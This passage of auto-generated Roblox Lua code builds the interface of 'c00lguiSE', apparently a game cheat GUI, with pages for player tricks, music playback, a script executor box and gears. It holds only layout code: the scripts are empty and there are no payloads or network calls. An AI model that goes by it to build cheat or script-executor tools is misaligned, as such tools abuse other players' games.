G2L["73"]["BorderSizePixel"] = 0;
G2L["73"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["73"]["TextSize"] = 15;
G2L["73"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["73"]["RichText"] = true;
G2L["73"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["73"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["73"]["Name"] = [[Button]];
G2L["73"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["73"]["Text"] = [[Play Animation]];
G2L["73"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["74"] = Instance.new("LocalScript", G2L["73"]);
G2L["74"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["75"] = Instance.new("TextButton", G2L["57"]);
G2L["75"]["TextWrapped"] = true;
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["TextSize"] = 15;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["75"]["RichText"] = true;
G2L["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["75"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["75"]["Name"] = [[Button]];
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Text"] = [[Anti-Fling: OFF]];
G2L["75"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["76"] = Instance.new("LocalScript", G2L["75"]);
G2L["76"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button
G2L["77"] = Instance.new("TextButton", G2L["57"]);
G2L["77"]["TextWrapped"] = true;
G2L["77"]["BorderSizePixel"] = 0;
G2L["77"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["77"]["TextSize"] = 15;
G2L["77"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["77"]["RichText"] = true;
G2L["77"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["77"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["77"]["Name"] = [[Button]];
G2L["77"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["77"]["Text"] = [[Spin: OFF]];
G2L["77"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
G2L["78"] = Instance.new("LocalScript", G2L["77"]);
G2L["78"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Music
G2L["79"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["79"]["Visible"] = false;
G2L["79"]["Active"] = true;
G2L["79"]["BorderSizePixel"] = 0;
G2L["79"]["ScrollingEnabled"] = false;
G2L["79"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["79"]["Name"] = [[Music]];
G2L["79"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["79"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["79"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["79"]["ScrollBarThickness"] = 0;


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl
G2L["7a"] = Instance.new("Frame", G2L["79"]);
G2L["7a"]["ZIndex"] = 2;
G2L["7a"]["BorderSizePixel"] = 3;
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["7a"]["Size"] = UDim2.new(0, 238, 0, 25);
G2L["7a"]["Position"] = UDim2.new(0.191, 0, 0.11, 0);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["7a"]["Name"] = [[MusicControl]];
G2L["7a"]["BackgroundTransparency"] = 0.5;


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.MusicInput
G2L["7b"] = Instance.new("TextBox", G2L["7a"]);
G2L["7b"]["Name"] = [[MusicInput]];
G2L["7b"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["7b"]["BorderSizePixel"] = 2;
G2L["7b"]["TextWrapped"] = true;
G2L["7b"]["TextSize"] = 14;
G2L["7b"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7b"]["PlaceholderText"] = [[ID]];
G2L["7b"]["Size"] = UDim2.new(0, 131, 0, 25);
G2L["7b"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["7b"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.Pitch
G2L["7c"] = Instance.new("TextBox", G2L["7a"]);
G2L["7c"]["Name"] = [[Pitch]];
G2L["7c"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["7c"]["BorderSizePixel"] = 2;
G2L["7c"]["TextWrapped"] = true;
G2L["7c"]["TextSize"] = 14;
G2L["7c"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["7c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7c"]["PlaceholderText"] = [[Pit.]];
G2L["7c"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["7c"]["Position"] = UDim2.new(0.78964, 0, 0, 0);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["7c"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.Pitch.LocalScript
G2L["7d"] = Instance.new("LocalScript", G2L["7c"]);



-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.Volume
G2L["7e"] = Instance.new("TextBox", G2L["7a"]);
G2L["7e"]["Name"] = [[Volume]];
G2L["7e"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["7e"]["ZIndex"] = 2;
G2L["7e"]["BorderSizePixel"] = 2;
G2L["7e"]["TextWrapped"] = true;
G2L["7e"]["TextSize"] = 14;
G2L["7e"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7e"]["PlaceholderText"] = [[Vol.]];
G2L["7e"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["7e"]["Position"] = UDim2.new(0.67306, 0, 0, 0);
G2L["7e"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["7e"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.Volume.LocalScript
G2L["7f"] = Instance.new("LocalScript", G2L["7e"]);



-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.PlayPause
G2L["80"] = Instance.new("TextButton", G2L["7a"]);
G2L["80"]["BorderSizePixel"] = 2;
G2L["80"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["80"]["TextSize"] = 14;
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["80"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["80"]["Size"] = UDim2.new(0, 29, 0, 25);
G2L["80"]["Name"] = [[PlayPause]];
G2L["80"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["80"]["Text"] = [[Play]];
G2L["80"]["Position"] = UDim2.new(0.55121, 0, 0, 0);


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.PlayPause.LocalScript
G2L["81"] = Instance.new("LocalScript", G2L["80"]);



-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.Distortion
G2L["82"] = Instance.new("TextBox", G2L["7a"]);
G2L["82"]["Name"] = [[Distortion]];
G2L["82"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["82"]["BorderSizePixel"] = 2;
G2L["82"]["TextWrapped"] = true;
G2L["82"]["TextSize"] = 14;
G2L["82"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["82"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["82"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["82"]["PlaceholderText"] = [[Dis.]];
G2L["82"]["Size"] = UDim2.new(0, 25, 0, 25);
G2L["82"]["Position"] = UDim2.new(0.89468, 0, 0, 0);
G2L["82"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["82"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicControl.Distortion.LocalScript
G2L["83"] = Instance.new("LocalScript", G2L["82"]);



-- StarterGui.c00lguiSE.Main.Pages.Music.NowPlaying
G2L["84"] = Instance.new("TextLabel", G2L["79"]);
G2L["84"]["TextWrapped"] = true;
G2L["84"]["Active"] = true;
G2L["84"]["BorderSizePixel"] = 0;
G2L["84"]["TextSize"] = 18;
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/Roboto.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["84"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["84"]["BackgroundTransparency"] = 1;
G2L["84"]["RichText"] = true;
G2L["84"]["Size"] = UDim2.new(0, 388, 0, 33);
G2L["84"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["84"]["Text"] = [[Now Playing: None]];
G2L["84"]["Name"] = [[NowPlaying]];
G2L["84"]["Position"] = UDim2.new(0, 0, 0.015, 0);


-- StarterGui.c00lguiSE.Main.Pages.Music.NowPlaying.LocalScript
G2L["85"] = Instance.new("LocalScript", G2L["84"]);



-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection
G2L["86"] = Instance.new("ScrollingFrame", G2L["79"]);
G2L["86"]["Active"] = true;
G2L["86"]["ZIndex"] = 2;
G2L["86"]["BorderSizePixel"] = 0;
G2L["86"]["CanvasSize"] = UDim2.new(0, 0, 0.3, 0);
G2L["86"]["ScrollingEnabled"] = false;
G2L["86"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["86"]["Name"] = [[MusicSelection]];
G2L["86"]["Size"] = UDim2.new(0, 390, 0, 96);
G2L["86"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["86"]["Position"] = UDim2.new(-0.001, 0, 0.213, 0);
G2L["86"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["86"]["ScrollBarThickness"] = 0;


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.UIListLayout
G2L["87"] = Instance.new("UIListLayout", G2L["86"]);
G2L["87"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["87"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["87"]["Wraps"] = true;
G2L["87"]["VerticalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["87"]["Padding"] = UDim.new(0.01, 0);
G2L["87"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["87"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button
G2L["88"] = Instance.new("TextButton", G2L["86"]);
G2L["88"]["TextWrapped"] = true;
G2L["88"]["BorderSizePixel"] = 0;
G2L["88"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["88"]["TextSize"] = 15;
G2L["88"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["88"]["RichText"] = true;
G2L["88"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["88"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["88"]["Name"] = [[Button]];
G2L["88"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["88"]["Text"] = [[Robot Rock]];
G2L["88"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
G2L["89"] = Instance.new("LocalScript", G2L["88"]);
G2L["89"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button
G2L["8a"] = Instance.new("TextButton", G2L["86"]);
G2L["8a"]["TextWrapped"] = true;
G2L["8a"]["BorderSizePixel"] = 0;
G2L["8a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8a"]["TextSize"] = 15;
G2L["8a"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["8a"]["RichText"] = true;
G2L["8a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8a"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["8a"]["Name"] = [[Button]];
G2L["8a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8a"]["Text"] = [[Jumpstyle]];
G2L["8a"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
G2L["8b"] = Instance.new("LocalScript", G2L["8a"]);
G2L["8b"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button
G2L["8c"] = Instance.new("TextButton", G2L["86"]);
G2L["8c"]["TextWrapped"] = true;
G2L["8c"]["BorderSizePixel"] = 0;
G2L["8c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8c"]["TextSize"] = 15;
G2L["8c"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["8c"]["RichText"] = true;
G2L["8c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8c"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["8c"]["Name"] = [[Button]];
G2L["8c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8c"]["Text"] = [[Raining Tacos]];
G2L["8c"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
G2L["8d"] = Instance.new("LocalScript", G2L["8c"]);
G2L["8d"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button
G2L["8e"] = Instance.new("TextButton", G2L["86"]);
G2L["8e"]["TextWrapped"] = true;
G2L["8e"]["BorderSizePixel"] = 0;
G2L["8e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8e"]["TextSize"] = 15;
G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["8e"]["RichText"] = true;
G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8e"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["8e"]["Name"] = [[Button]];
G2L["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8e"]["Text"] = [[Crab Rave]];
G2L["8e"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
G2L["8f"] = Instance.new("LocalScript", G2L["8e"]);
G2L["8f"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button
G2L["90"] = Instance.new("TextButton", G2L["86"]);
G2L["90"]["TextWrapped"] = true;
G2L["90"]["BorderSizePixel"] = 0;
G2L["90"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["TextSize"] = 15;
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["90"]["RichText"] = true;
G2L["90"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["90"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["90"]["Name"] = [[Button]];
G2L["90"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["90"]["Text"] = [[Gothic]];
G2L["90"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
G2L["91"] = Instance.new("LocalScript", G2L["90"]);
G2L["91"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button
G2L["92"] = Instance.new("TextButton", G2L["86"]);
G2L["92"]["TextWrapped"] = true;
G2L["92"]["BorderSizePixel"] = 0;
G2L["92"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["92"]["TextSize"] = 15;
G2L["92"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["92"]["RichText"] = true;
G2L["92"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["92"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["92"]["Name"] = [[Button]];
G2L["92"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["92"]["Text"] = [[Stadium Rave]];
G2L["92"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
G2L["93"] = Instance.new("LocalScript", G2L["92"]);
G2L["93"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button
G2L["94"] = Instance.new("TextButton", G2L["86"]);
G2L["94"]["TextWrapped"] = true;
G2L["94"]["BorderSizePixel"] = 0;
G2L["94"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["TextSize"] = 15;
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["94"]["RichText"] = true;
G2L["94"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["94"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["94"]["Name"] = [[Button]];
G2L["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["94"]["Text"] = [[Electro Sp00k]];
G2L["94"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
G2L["95"] = Instance.new("LocalScript", G2L["94"]);
G2L["95"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button
G2L["96"] = Instance.new("TextButton", G2L["86"]);
G2L["96"]["TextWrapped"] = true;
G2L["96"]["BorderSizePixel"] = 0;
G2L["96"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["96"]["TextSize"] = 15;
G2L["96"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["96"]["RichText"] = true;
G2L["96"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["96"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["96"]["Name"] = [[Button]];
G2L["96"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["96"]["Text"] = [[Scream]];
G2L["96"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicSelection.Button.ButtonScript
G2L["97"] = Instance.new("LocalScript", G2L["96"]);
G2L["97"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Music.MusicBars
G2L["98"] = Instance.new("LocalScript", G2L["79"]);
G2L["98"]["Name"] = [[MusicBars]];


-- StarterGui.c00lguiSE.Main.Pages.Executor
G2L["99"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["99"]["Visible"] = false;
G2L["99"]["Active"] = true;
G2L["99"]["BorderSizePixel"] = 0;
G2L["99"]["ScrollingEnabled"] = false;
G2L["99"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["99"]["Name"] = [[Executor]];
G2L["99"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["99"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["99"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["99"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["99"]["ScrollBarThickness"] = 0;


-- StarterGui.c00lguiSE.Main.Pages.Executor.Buttons
G2L["9a"] = Instance.new("ScrollingFrame", G2L["99"]);
G2L["9a"]["Active"] = true;
G2L["9a"]["BorderSizePixel"] = 0;
G2L["9a"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["9a"]["ScrollingEnabled"] = false;
G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["9a"]["Name"] = [[Buttons]];
G2L["9a"]["Size"] = UDim2.new(0, 59, 0, 200);
G2L["9a"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["9a"]["Position"] = UDim2.new(0.84712, 0, 0, 0);
G2L["9a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9a"]["ScrollBarThickness"] = 0;


-- StarterGui.c00lguiSE.Main.Pages.Executor.Buttons.Execute
G2L["9b"] = Instance.new("TextButton", G2L["9a"]);
G2L["9b"]["TextWrapped"] = true;
G2L["9b"]["BorderSizePixel"] = 0;
G2L["9b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9b"]["TextSize"] = 15;
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["9b"]["RichText"] = true;
G2L["9b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9b"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["9b"]["Name"] = [[Execute]];
G2L["9b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9b"]["Text"] = [[Execute]];
G2L["9b"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Executor.Buttons.Execute.ButtonScript
G2L["9c"] = Instance.new("LocalScript", G2L["9b"]);
G2L["9c"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Executor.Buttons.UIListLayout
G2L["9d"] = Instance.new("UIListLayout", G2L["9a"]);
G2L["9d"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["9d"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["9d"]["Wraps"] = true;
G2L["9d"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill;
G2L["9d"]["Padding"] = UDim.new(0.05, 0);
G2L["9d"]["SortOrder"] = Enum.SortOrder.LayoutOrder;


-- StarterGui.c00lguiSE.Main.Pages.Executor.Buttons.Clear
G2L["9e"] = Instance.new("TextButton", G2L["9a"]);
G2L["9e"]["TextWrapped"] = true;
G2L["9e"]["BorderSizePixel"] = 0;
G2L["9e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9e"]["TextSize"] = 15;
G2L["9e"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["9e"]["RichText"] = true;
G2L["9e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9e"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["9e"]["Name"] = [[Clear]];
G2L["9e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9e"]["Text"] = [[Clear]];
G2L["9e"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Executor.Buttons.Clear.ButtonScript
G2L["9f"] = Instance.new("LocalScript", G2L["9e"]);
G2L["9f"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Executor.InputArea
G2L["a0"] = Instance.new("ScrollingFrame", G2L["99"]);
G2L["a0"]["Active"] = true;
G2L["a0"]["BorderSizePixel"] = 0;
G2L["a0"]["CanvasSize"] = UDim2.new(9999, 0, 9999, 0);
G2L["a0"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["a0"]["Name"] = [[InputArea]];
G2L["a0"]["Size"] = UDim2.new(0, 328, 0, 136);
G2L["a0"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["a0"]["Position"] = UDim2.new(-0.00082, 0, 0, 0);
G2L["a0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a0"]["ScrollBarThickness"] = 7;


-- StarterGui.c00lguiSE.Main.Pages.Executor.InputArea.Input
G2L["a1"] = Instance.new("TextBox", G2L["a0"]);
G2L["a1"]["Name"] = [[Input]];
G2L["a1"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a1"]["BorderSizePixel"] = 0;
G2L["a1"]["TextWrapped"] = true;
G2L["a1"]["TextSize"] = 14;
G2L["a1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a1"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a1"]["RichText"] = true;
G2L["a1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a1"]["MultiLine"] = true;
G2L["a1"]["ClearTextOnFocus"] = false;
G2L["a1"]["Size"] = UDim2.new(0, 9999, 0, 9999);
G2L["a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a1"]["Text"] = [[print("Hello World!")]];
G2L["a1"]["BackgroundTransparency"] = 1;


-- StarterGui.c00lguiSE.Main.Pages.Executor.Output
G2L["a2"] = Instance.new("TextBox", G2L["99"]);
G2L["a2"]["Interactable"] = false;
G2L["a2"]["Name"] = [[Output]];
G2L["a2"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["a2"]["BorderSizePixel"] = 0;
G2L["a2"]["TextEditable"] = false;
G2L["a2"]["TextWrapped"] = true;
G2L["a2"]["TextSize"] = 14;
G2L["a2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a2"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["a2"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["a2"]["RichText"] = true;
G2L["a2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a2"]["MultiLine"] = true;
G2L["a2"]["ClearTextOnFocus"] = false;
G2L["a2"]["Size"] = UDim2.new(0, 327, 0, 58);
G2L["a2"]["Position"] = UDim2.new(-0.00258, 0, 0.28625, 0);
G2L["a2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a2"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Gears
G2L["a3"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["a3"]["Visible"] = false;
G2L["a3"]["Active"] = true;
G2L["a3"]["BorderSizePixel"] = 0;
G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["a3"]["Name"] = [[Gears]];
G2L["a3"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["a3"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["a3"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a3"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Gears.UIListLayout
G2L["a4"] = Instance.new("UIListLayout", G2L["a3"]);
G2L["a4"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["a4"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["a4"]["Wraps"] = true;
G2L["a4"]["Padding"] = UDim.new(0.01, 0);
G2L["a4"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["a4"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Gears.Button
G2L["a5"] = Instance.new("TextButton", G2L["a3"]);
G2L["a5"]["TextWrapped"] = true;
G2L["a5"]["BorderSizePixel"] = 0;
G2L["a5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a5"]["TextSize"] = 15;
G2L["a5"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["a5"]["RichText"] = true;
